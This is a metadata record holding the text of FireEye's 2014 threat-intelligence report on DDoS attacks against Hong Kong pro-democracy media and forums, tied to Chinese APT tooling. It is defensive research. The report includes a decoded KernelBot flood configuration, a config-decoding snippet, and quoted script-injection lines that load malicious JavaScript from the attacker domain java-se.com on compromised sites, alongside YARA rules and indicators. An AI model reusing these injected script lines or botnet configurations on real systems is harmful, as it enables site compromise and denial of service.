{
    "id": "2fa753d5-cc5e-4719-81e4-6acf34fb957f",
    "created_at": "2022-10-25T16:48:24.579426Z",
    "updated_at": "2025-03-27T02:08:51.438647Z",
    "deleted_at": null,
    "sha1_hash": "40674e70c595d30f19b2c2636ed7d9dc6b146e8e",
    "title": "Operation Poisoned Handover: Unveiling Ties Between Apt Activity In Hong Kong's Pro-Democracy Movement",
    "authors": "FireEye",
    "file_creation_date": "2014-11-06T15:13:24Z",
    "file_modification_date": "2014-11-06T15:13:24Z",
    "file_size": 176051,
    "plain_text": "# in Hong Kong’s Pro-Democracy Movement\n\nAs the pro-democracy movement in Hong Kong has continued, we’ve been watching for indications of\n\nconfrontation taking place in cyberspace. Protests began in September and have continued to escalate.\n\nIn recent weeks, attackers have launched a series of Distributed Denial of Service attacks (DDoS) against\n\nwebsites promoting democracy in Hong Kong. According to the Wall Street Journal, websites belonging to\n\nNext Media’s Apple Daily publication have suffered from an ongoing DDoS attack that “brought down its\n\nemail system for hours”. According to other reports, Next Media’s network has suffered a “total failure” as\n\na result of these attacks. Additionally, at least one member of the popular online forum HKGolden was\n\narrested for posting messages encouraging support for the OccupyCentral Pro Democracy movement.\n\nThe use of DDoS attacks as a political tool during times of conflict is not new; patriotic hacktivist groups\n\nfrequently use them as a means to stifle political activity of which they disapprove. The question of state\n\nsponsorship (or at least tacit approval) in online crackdowns is often up for debate and ambiguous from a\n\ntechnical evidence and tradecraft perspective.\n\nIn this case, however, we’ve discovered an overlap in the tools and infrastructure used by China-based\n\nadvanced persistent threat (APT) actors and the DDoS attack activity. We believe that these DDoS attacks\n\nare linked to previously observed APT activity, including Operation Poisoned Hurricane. This correlation\n\nsheds light on the potential relationships, symbiosis and tool sharing between patriotic hacker activities\n\ndesigned to disrupt anti-government activists in China, and the APT activity we consistently see that is\n\nmore IP theft and espionage-focused.\n\n## Ongoing DDoS Attacks Target the Pro-Democracy Movement\n\nFireEye has identified a number of binaries coded to receive instructions from a set of command and\n\ncontrol (C2) servers instructing participating bots to attack Next Media-owned websites and the\n\nHKGolden forum. Next Media is a large media company in Hong Kong and the HkGolden forum has been\n\nused as a platform to organize pro-democracy protests. Each sample we identified is signed with digital\n\ncertificates that have also been used by APT actors to sign binaries in previous intrusion operations:\n\n\n-----\n\nKernelBot . All of the samples we identified have the NewVersion value of 20140926. Structurally, all of\n\nthese samples are similar in that they drop three files:\n\n- ctfmon.exe-a legitimate, signed copy of the Pidgin IM client\n\n(md5 hash = 1685f978149d7ba8e039af9a4d5803c7)\n\n- libssp-0.dll–malware DLL which is side-loaded by ctfmon.exe\n\nto decode and launch KernelBot. Most versions of this dll are also\n\nsigned by either the QTI or CallTogether certificate.\n\n- readme.txt – a binary file which contains the XOR-encoded\n\nKernelBot DLL as well as C2 destination information (most have\n\nmd5 hash of b5ac964a74091d54e091e68cecd5b532)\n\nThe KernelBot implants receive targeting instructions from C2 servers hard-coded directly into the\n\nsample. For example, c3d6450075d618b1edba17ee723eb3ca drops a KernelBot variant that connects to\n\nboth www.sapporo-digital-photoclub[.]com and wakayamasatei[.]com. The full list of C2 servers we\n\nidentified is as follows:\n\nsapporo-digital-photoclub[.]com\n\nwakayamasatei[.]com\n\ntommo[.]jp\n\nmizma.co[.]jp\n\nsp.you-maga[.]com\n\nnitori-tour[.]com\n\nninekobe[.]com\n\nshinzenho[.]jp\n\nwizapply[.]com\n\nwww.credo-biz[.]com\n\nOn Oct. 21, the control server at wakayamasatei[.]com responded with the following encoded\n\nconfiguration file:\n\n@$@cWFPWERPRnlPXl5DRE13JyBjWXhPWkVYXnleS15PFxonIGNZbkVdRGxDRk\n\n94X0QaFxonIGlHTmNuGhcbJyBuRV1EbENGT3hfRH9YRhoXQl5eWhAFBRsaBBo\n\nEGwQbHxsFGwRPUk8nIHF/Wk5LXk95T1hcT1h3JyBkT118T1hZQ0VEFxgaGx4\n\naExgcJyB/Wk5LXk9sQ0ZPf1hGF0JeXloQBQUbGgQaBBsEGx8bBRsET1JPJyBx\n\nbm5leXViRVleeV5LXkNZXkNJWXcnIGlFX0Ref1hGFycgfkNHT1gXGCcgcW5uZ\n\nXl1eUlYQ1pebEZFRU53JyBjWXlJWENaXmxGRUVOFxsnIGlHTmNuFxsYGScgeU\n\n\n-----\n\naRk9OS0NGUwRJRUcEQkEFJyB5SVhDWl5sRkVFTnpFWF4XEhonIGNZbU9ef1hG\n\nbENGTxcbJyBjWXlPRE56S0lBT14XGicgfkJYT0tOZkVFWn5DR08XHycgfkJYT\n\n0tOaUVfRF4XGxonIH5DR09YFxkcGicgY1l+Q0dPWBcbJyBxbm5leXV5SVhDWl\n\n5sRkVFTnVrG3cnIGNZeUlYQ1pebEZFRU4XGicgaUdOY24XGycgeUlYQ1pebEZ\n\nFRU5uZHkXGxoEGgQbBBsfGycgeUlYQ1pebEZFRU5/WEYXGxoEGgQbBBsfGwUb\n\nBEJeR0YnIHlJWENaXmxGRUVOekVYXhcSGicgY1ltT15/WEZsQ0ZPFxsnIGNZe\n\nU9ETnpLSUFPXhcbJyB+QlhPS05mRUVafkNHTxcbJyB+QlhPS05pRV9EXhcbJy\n\nB+Q0dPWBcYGicgY1l+Q0dPWBcbJyBxbm5leXV/TlpsRkVFTncnIGNZf05abEZ\n\nFRU4XGicgaUdOY24XGycgf05abEZFRU5uZHkXGxoEGgQbBBsfGycgfkJYT0tO\n\naUVfRF4XGycgfkNHT1gXGBonIGNZfkNHT1gXGycgcW5uZXl1f05abEZFRU51a\n\nxt3JyBjWX9OWmxGRUVOFxonIGlHTmNuFxsnIH9OWmxGRUVObmR5FxsaBBoEGw\n\nQbHxsnIH5CWE9LTmlFX0ReFxsnIH5DR09YFxgaJyBjWX5DR09YFxsnIHFubmV\n\n5dXlTRGxGRUVOdycgY1l5U0RsRkVFThcaJyBpR05jbhcbJyB5U0RsRkVFTm5k\n\neRcbGgQaBBsEGx8bJyB5U0RsRkVFTnpFWF4XEhonIH5CWE9LTmlFX0ReFxsnI\n\nH5DR09YFxgaJyBjWX5DR09YFxsnIHFubmV5dX5JWmxGRUVOdycgY1l+SVpsRk\n\nVFThcaJyBpR05jbhcbJyB+SVpsRkVFTm5keRcbGgQaBBsEGx8bJyB+SVpsRkV\n\nFTnpFWF4XEhonIGNZeU9ETnpLSUFPXhcbJyB+QlhPS05pRV9EXhcbJyB+Q0dP\n\nWBcYGicgY1l+Q0dPWBcbJyBxbm5leXV+SVpsRkVFTnVrG3cnIGNZfklabEZFR\n\nU4XGicgaUdOY24XGycgfklabEZFRU5uZHkXGxoEGgQbBBsfGycgfklabEZFRU\n\n56RVheFxIaJyBjWXlPRE56S0lBT14XGycgfkJYT0tOaUVfRF4XHCcgfkNHT1g\n\nXGBonIGNZfkNHT1gXGycg@$@\n\nThis configuration file can be decoded by stripping the leading and trailing @$@ characters. At this point,\n\na simple base64 and XOR decode will reveal the plaintext configuration. The following snippet of python\n\ncode can be used to decode this command:\n\nb64encoded = request.content.rstrip('@$@').lstrip('@$@')\n\nb64decoded = b64encoded.decode(\"base64\")\n\ncommand = \"\"\n\nfor c in b64decoded:\n\nx = ord(c)\n\nx = x ^ XOR_key\n\ncommand += chr(x)\n\n\n-----\n\nDDOS C2 servers in this campaign. The two different keys are 0x2A or 0x7E. The encoded configuration\n\nfile shown above decodes to:\n\n[KernelSetting]\n\nIsReportState=0\n\nIsDownFileRun0=0\n\nCmdID0=1\n\nDownFileRunUrl0=http://10.0.1.151/1.exe\n\n[UpdateServer]\n\nNewVersion=20140926\n\nUpdateFileUrl=http://10.0.1.151/1.exe\n\n[DDOS_HostStatistics]\n\nCountUrl=\n\nTimer=2\n\n[DDOS_ScriptFlood]\n\nIsScriptFlood=1\n\nCmdID=123\n\nScriptFloodDNS=\n\nScriptFloodUrl=http://nxapi.appledaily.com.hk/\n\nScriptFloodPort=80\n\nIsGetUrlFile=1\n\nIsSendPacket=0\n\nThreadLoopTime=5\n\nThreadCount=10\n\nTimer=360\n\nIsTimer=1\n\n[DDOS_ScriptFlood_A1]\n\nIsScriptFlood=0\n\nCmdID=1\n\nScriptFloodDNS=10.0.1.151\n\nScriptFloodUrl=10.0.1.151/1.html\n\nScriptFloodPort=80\n\nIsGetUrlFile=1\n\nIsSendPacket=1\n\nThreadLoopTime=1\n\nThreadCount=1\n\n\n-----\n\nIsTimer 1\n\n[DDOS_UdpFlood]\n\nIsUdpFlood=0\n\nCmdID=1\n\nUdpFloodDNS=10.0.1.151\n\nThreadCount=1\n\nTimer=20\n\nIsTimer=1\n\n[DDOS_UdpFlood_A1]\n\nIsUdpFlood=0\n\nCmdID=1\n\nUdpFloodDNS=10.0.1.151\n\nThreadCount=1\n\nTimer=20\n\nIsTimer=1\n\n[DDOS_SynFlood]\n\nIsSynFlood=0\n\nCmdID=1\n\nSynFloodDNS=10.0.1.151\n\nSynFloodPort=80\n\nThreadCount=1\n\nTimer=20\n\nIsTimer=1\n\n[DDOS_TcpFlood]\n\nIsTcpFlood=0\n\nCmdID=1\n\nTcpFloodDNS=10.0.1.151\n\nTcpFloodPort=80\n\nIsSendPacket=1\n\nThreadCount=1\n\nTimer=20\n\nIsTimer=1\n\n[DDOS_TcpFlood_A1]\n\nIsTcpFlood=0\n\nCmdID=1\n\n\n-----\n\nTcpFloodPort 80\n\nIsSendPacket=1\n\nThreadCount=6\n\nTimer=20\n\nIsTimer=1\n\nDuring the course of our research, we’ve observed more than 30 different unique configuration files issued\n\nby the C2 servers listed above. These configurations issued commands to attack the following domains and\n\nIPs:\n\nnxapi.appledaily.com[.]hk\n\n202.85.162.90\n\n58.64.139.10\n\n202.85.162.97\n\n202.85.162.81\n\n198.41.222.6\n\n202.85.162.101\n\n202.85.162.95\n\n202.85.162.180\n\n202.85.162.140\n\n202.85.162.130\n\n124.217.214.149\n\nAll of the above IPs host Next Media or Apple daily websites, with the exception of 58.64.139.10 and\n\n124.217.214.149. The IP 58.64.139.10 has hosted hkgolden[.]com – the domain for the HKGolden forum\n\nmentioned above.\n\nFor approximately 14 hours between October 23rd and 24th, the attackers pushed a configuration update\n\nto four controls servers that instructed bots under their control to flood 124.217.214.149 with UDP traffic.\n\nThe IP 124.217.214.149 hosted the attacker controlled domain p.java-sec[.]com.\n\nOn Oct. 23, 2014, two of the active controls began instructing participating bots to cease attacks. By Oct.\n\n24, 2014, all five of the known active control servers were issuing commands to cease the attacks.\n\nIt should come as no surprise that hkgolden[.]com, nextmedia[.]com, and appledaily.com[.]hk websites\n\nare now or previously have been blocked by the Great Firewall of China – indicating that the PRC has\n\nfound the content hosted on these sites objectionable.\n\n\n-----\n\nThe most direct connection between these DDoS attacks and previous APT activity is the use of the QTI\n\nInternational and CallTogether code signing certificates, which we have seen in malware attributed to APT\n\nactivity.\n\nThe QTI International digital certificate has been previously used to sign binaries used in APT activity\n\nincluding Operation Poisoned Hurricane. Specifically, 17bc9d2a640da75db6cbb66e5898feb1 is a PlugX\n\nvariant signed by the QTI International certificate. This PlugX variant connected to a Google Code project\n\nat code.google[.]com/p/udom/, where it decoded a command that configured its C2 server.\n\nThe sample 0b54ae49fd5a841970b98a078968cb6b was signed with the QTI International certificate as\n\nwell. This sample was first observed during a drive-by attack in June 2014, and was downloaded from\n\njava-se[.]com/jp.jpg. This sample is detected as Backdoor.APT.Preshin and connected to luxscena[.]com\n\nfor C2.\n\nThe QTI International certificate was also used to sign e2a4b96cce9de4fb126cfd5f5c73c3ed. We detect\n\nthis payload as Backdoor.APT.PISCES and it used hk.java-se[.]com for C2. The java-se[.]com website was\n\npreviously used in other attacks targeting the pro-democracy movement in Hong Kong. We first observed\n\nthe presence of malicious javascript inserted into Hong Kong Association for Democracy and People’s\n\nLivelihood on June 26, 2014, which appeared as the following:\n\n<a href=\"http://www.adpl.org.hk/?p=2680\" title=\"抗議九巴加價要求凍結加價、改善服務\n\n<script language=javascript src=http://java-se.com/o.js></script>\">\n\n_More recently, as noted by Claudio Guarnieri, the website of the Democratic Party of Hong Kong was_\n\n_seen hosting a redirect to the same malicious javascript._\n\n_The CallTogether certificate has been used to sign ecf21054ab515946a812d1aa5c408ca5. We also detect_\n\n_this payload as Backdoor.APT.PISCES and observed it connect to u.java-se[.]com._\n\n_Both of these certificates are valid but can be detected and blocked via the following Yara signatures:_\n\nrule callTogether_certificate\n\n{\n\nmeta:\n\nauthor = \"Fireeye Labs\"\n\nversion = \"1.0\"\n\nreference_hash = \"d08e038d318b94764d199d7a85047637\"\n\ndescription = “detects binaries signed with the CallTogether certificate”\n\n\n-----\n\n$serial {452156C3B3FB0176365BDB5B7715BC4C}\n\n$o = \"CallTogether, Inc.\"\n\ncondition:\n\n$serial and $o\n\n}\n\nrule qti_certificate\n\n{\n\nmeta:\n\nauthor = \"Fireeye Labs\"\n\nreference_hash = \"cfa3e3471430a0096a4e7ea2e3da6195\"\n\ndescription = \"detects binaries signed with the QTI International Inc\n\ncertificate\"\n\nstrings:\n\n$cn = \"QTI International Inc\"\n\n$serial = { 2e df b9 fd cf a0 0c cb 5a b0 09 ee 3a db 97 b9 }\n\ncondition:\n\n$cn and $serial\n\n}\n\nThese ongoing DDoS attacks and previous APT intrusion activity both target the hkgolden[.]com website.\n\nAs noted above, this site has been targeted with a DDoS attack by a KernelBot network. We also found that\n\nthe hkgolden[.]com website was compromised on Sept. 5, 2014 and had a redirect to a malicious javascript\n\nagain hosted at another jave-se[.]com host, which appeared as follows:\n\ndocument.write(\"<script language=javascript src=http://jre76.java\nse.com/js/rss.js></script>\n\nFinally, as noted above the IP 124.217.214.149 was seen hosting the domain p.java-sec[.]com between Oct.\n\n[25, 2014 and Oct. 27, 2014. As Brandon Dixon noted here, the java-sec[.]com domain is linked to the java-](https://twitter.com/9bplus)\n\nse[.]com by shared hosting history at the following IP address:\n\n124.248.237.26\n\n223.29.248.9\n\n211.233.89.182\n\n112.175.143.2\n\n112.175.143.9\n\n\n-----\n\nattackers wanted to test their botnet s capability by attacking an IP they were using to gather statistics on\n\nthe size of the attack. It is also possible that the attackers simply made a mistake and accidentally issued\n\ncommands to attack their own infrastructure. On Oct. 24, 2014, after attacking their own infrastructure,\n\nthe attackers issued new instructions to their botnet that ceased all attacks.\n\n## Conclusion\n\nWhile not conclusive, the evidence presented above shows a link between confirmed APT\n\n**activity and ongoing DDoS attacks that appear to be designed to silence the Pro Democracy**\n\n**movement in Hong Kong. The evidence does not conclusively prove that the same actors responsible**\n\nfor the DDoS attacks are also behind the observed intrusion activity discussed above – such as Operation\n\nPoisoned Hurricane. Rather, the evidence may indicate that a common quartermaster supports\n\nboth the DDoS attacks and ongoing intrusion activity.\n\nIn either scenario, there is a clear connection between the intrusion activity documented in Operation\n\nPoisoned Hurricane and the DDOS attacks documented here. While the tactics of these activities are very\n\ndifferent from a technical perspective, each supports distinct political objectives. Operation Poisoned\n\nHurricane’s objective appeared to have in part been IP theft possibly for economic gain or other\n\ncompetitive advantages. In the DDOS attacks, the objective was to silence free speech and suppress the\n\npro democracy movement in Hong Kong. The Chinese government is the entity most likely to be\n\ninterested in achieving both of these objectives.\n\n## APPENDIX\n\nMD5s\n\nc3d6450075d618b1edba17ee723eb3ca\n\nd08e038d318b94764d199d7a85047637\n\n84bd0809b1dbc2dc86f30d30faaa7e4e\n\n39bb90140fc0101f49377b6c60076f9d\n\ncaa5529010c17b969da01ade084794c6\n\n17bc9d2a640da75db6cbb66e5898feb1\n\n0b54ae49fd5a841970b98a078968cb6b\n\ne2a4b96cce9de4fb126cfd5f5c73c3ed\n\necf21054ab515946a812d1aa5c408ca5\n\nHOSTNAMES\n\n\n-----\n\nmizma.co[.]jp\n\nsp.you-maga[.]com\n\nnitori-tour[.]com\n\nninekobe[.]com\n\nshinzenho[.]jp\n\nwizapply[.]com\n\nwww.credo-biz[.]com\n\nwww.sapporo-digital-photoclub[.]com\n\nwakayamasatei[.]com\n\nluxscena[.]com\n\njava-se[.]com\n\nhk.java-se[.]com\n\nu.java-se[.]com\n\njre76.java-se[.]com\n\np.java-sec[.]com\n\n[This entry was posted in Threat Intelligence, Threat Research and tagged advanced malware,](http://www.fireeye.com/blog/category/technical/threat-intelligence)\n\n[Cybersecurity, malware, zero-day by Ned Moran, Mike Oppenheim and Mike Scott. Bookmark the](http://www.fireeye.com/blog/tag/cybersecurity)\n\n[permalink.](http://www.fireeye.com/blog/technical/2014/11/operation-poisoned-handover-unveiling-ties-between-apt-activity-in-hong-kongs-pro-democracy-movement.html)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        },
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/4ld2qhui8rs1slmh76mzj9vaum353mk8",
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2014/2014.11.03.Operation_Poisoned_Handover/Operation_Poisoned_Handover.pdf"
    ],
    "report_names": [
        "Operation_Poisoned_Handover"
    ],
    "threat_actors": [
        {
            "id": "42a6a29d-6b98-4fd6-a742-a45a0306c7b0",
            "created_at": "2022-10-25T15:50:23.710403Z",
            "updated_at": "2025-03-27T02:00:55.531313Z",
            "deleted_at": null,
            "main_name": "Silence",
            "aliases": [
                "Whisper Spider"
            ],
            "source_name": "MITRE:Silence",
            "tools": [
                "Winexe",
                "SDelete"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "722b693d-cfdc-489e-a540-78c7d52ac5a8",
            "created_at": "2022-10-25T16:07:23.713768Z",
            "updated_at": "2025-03-27T02:02:09.940058Z",
            "deleted_at": null,
            "main_name": "Hurricane Panda",
            "aliases": [
                "Operation Poisoned Hurricane"
            ],
            "source_name": "ETDA:Hurricane Panda",
            "tools": [
                "CHINACHOPPER",
                "China Chopper",
                "Mimikatz",
                "SinoChopper"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "88e53203-891a-46f8-9ced-81d874a271c4",
            "created_at": "2022-10-25T16:07:24.191982Z",
            "updated_at": "2025-03-27T02:02:10.13692Z",
            "deleted_at": null,
            "main_name": "Silence",
            "aliases": [
                "ATK 86",
                "Contract Crew",
                "TAG-CR8",
                "TEMP.TruthTeller",
                "Whisper Spider"
            ],
            "source_name": "ETDA:Silence",
            "tools": [
                "EDA",
                "EmpireDNSAgent",
                "Farse",
                "Ivoke",
                "Kikothac",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Meterpreter",
                "ProxyBot",
                "ReconModule",
                "Silence.Downloader",
                "TiniMet",
                "TinyMet",
                "TrueBot",
                "xfs-disp.exe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716504,
    "ts_updated_at": 1743041331,
    "ts_creation_date": 1415286804,
    "ts_modification_date": 1415286804,
    "files": {
        "pdf": "https://archive.orkl.eu/40674e70c595d30f19b2c2636ed7d9dc6b146e8e.pdf",
        "text": "https://archive.orkl.eu/40674e70c595d30f19b2c2636ed7d9dc6b146e8e.txt",
        "img": "https://archive.orkl.eu/40674e70c595d30f19b2c2636ed7d9dc6b146e8e.jpg"
    }
}